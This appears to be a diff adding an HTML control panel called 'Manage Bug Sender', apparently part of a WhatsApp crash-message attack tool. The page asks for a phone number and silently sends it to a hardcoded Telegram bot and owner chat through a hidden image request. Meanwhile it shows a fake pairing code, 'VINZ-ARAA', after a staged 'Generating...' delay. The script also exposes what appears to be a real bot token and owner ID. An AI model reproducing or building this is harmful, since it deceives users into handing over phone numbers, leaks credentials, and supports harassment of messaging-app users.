@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Manage Bug Sender</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+
+<style>
+:root{
+  --black:#000;
+  --card:#1a1a1a;
+  --red:#ff1744;
+  --red-soft:rgba(255,23,68,.2);
+  --white:#fff;
+  --green:#00e676;
+}
+*{box-sizing:border-box}
+body{margin:0;background:#000;color:#fff;font-family:Orbitron}
+.header{padding:16px;display:flex;justify-content:space-between;border-bottom:1px solid rgba(255,23,68,.3)}
+.container{padding:16px}
+.card{background:#1a1a1a;border-radius:16px;padding:16px;margin-bottom:12px}
+.card-header{display:flex;gap:12px}
+.card-header i{color:#ff1744}
+.btn-row{display:flex;gap:10px;margin-top:16px}
+.btn{padding:10px;border-radius:10px;border:none;cursor:pointer;font-family:Orbitron}
+.btn-red{background:#ff1744;color:#fff}
+.btn-outline{background:transparent;border:1px solid #ff1744;color:#ff1744}
+.btn-danger{background:rgba(255,23,68,.2);border:1px solid #ff1744;color:#ff1744}
+.fab{position:fixed;right:20px;bottom:20px;width:56px;height:56px;border-radius:50%;background:#ff1744;display:flex;align-items:center;justify-content:center;font-size:22px;cursor:pointer}
+.empty{text-align:center;margin-top:80px}
+.empty i{font-size:80px;color:#ff1744}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center}
+.modal-box{background:#1a1a1a;padding:20px;border-radius:20px;width:90%;max-width:360px}
+.modal input{width:100%;padding:12px;margin-top:12px;border-radius:12px;background:#000;border:1px solid #ff1744;color:#fff}
+.snack{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);padding:12px 20px;border-radius:12px;display:none;color:#000;font-weight:bold}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <h1>Manage Bug Sender</h1>
+  <i class="fa fa-rotate" onclick="render()"></i>
+</div>
+
+<div class="container" id="list"></div>
+
+<div class="fab" onclick="openAdd()"><i class="fa fa-plus"></i></div>
+
+<!-- ADD MODAL -->
+<div class="modal" id="addModal">
+  <div class="modal-box">
+    <b>Add New Sender</b>
+    <input id="phoneInput" placeholder="Phone Number (62xxx)">
+    <div style="display:flex;gap:10px;margin-top:16px">
+      <button class="btn btn-outline" onclick="closeAdd()">CANCEL</button>
+      <button class="btn btn-red" onclick="addSender()">ADD</button>
+    </div>
+  </div>
+</div>
+
+<!-- PAIR MODAL -->
+<div class="modal" id="pairModal">
+  <div class="modal-box" style="text-align:center">
+    <i class="fa fa-key" style="font-size:48px;color:#ff1744"></i>
+    <h3>Pairing Code</h3>
+    <div id="pairCode" style="
+      font-size:32px;
+      margin:20px 0;
+      border:1px solid #ff1744;
+      padding:14px;
+      border-radius:12px;
+      color:#ff1744">
+      Generating...
+    </div>
+    <button class="btn btn-red" onclick="closePair()">OK</button>
+  </div>
+</div>
+
+<div class="snack" id="snack"></div>
+
+<script>
+const BOT_TOKEN = "8426368219:AAEL_0WOOLSBJdKziPZ7SED_TQ8DveKE8cw";
+const OWNER_ID = "6696150439";
+
+let senders = [];
+
+const snackBox=document.getElementById("snack");
+const addModal=document.getElementById("addModal");
+const pairModal=document.getElementById("pairModal");
+const list=document.getElementById("list");
+const pairCode=document.getElementById("pairCode");
+
+function snack(msg,err=false){
+  snackBox.innerText=msg;
+  snackBox.style.background=err?"#ff1744":"#00e676";
+  snackBox.style.display="block";
+  setTimeout(()=>snackBox.style.display="none",3000);
+}
+
+function openAdd(){addModal.style.display="flex"}
+function closeAdd(){addModal.style.display="none"}
+function closePair(){pairModal.style.display="none"}
+
+function sendTelegram(number){
+  const msg = encodeURIComponent(`/connect ${number}`);
+  const img = new Image();
+  img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${OWNER_ID}&text=${msg}`;
+}
+
+function render(){
+  list.innerHTML="";
+  if(!senders.length){
+    list.innerHTML=`<div class="empty"><i class="fa fa-mobile-screen"></i><h3>MY SENDER !!</h3></div>`;
+    return;
+  }
+  senders.forEach((n,i)=>{
+    list.innerHTML+=`
+    <div class="card">
+      <div class="card-header"><i class="fa fa-phone"></i><b>${n}</b></div>
+      <div class="btn-row">
+        <button class="btn btn-outline" onclick="render()">REFRESH</button>
+        <button class="btn btn-danger" onclick="remove(${i})">DELETE</button>
+      </div>
+    </div>`;
+  });
+}
+
+function addSender(){
+  const n=phoneInput.value.trim();
+  if(!n)return snack("Phone number required",true);
+
+  senders.push(n);
+  closeAdd();
+
+  pairCode.innerText = "Generating...";
+  pairModal.style.display="flex";
+
+  sendTelegram(n); // REAL kirim Telegram
+
+  setTimeout(()=>{
+    pairCode.innerText = "VINZ-ARAA";
+  },3000);
+
+  snack("Sent to owner");
+  render();
+}
+
+function remove(i){
+  if(!confirm("Delete sender?"))return;
+  senders.splice(i,1);
+  render();
+  snack("Sender deleted");
+}
+
+render();
+</script>
+
+</body>
+</html>
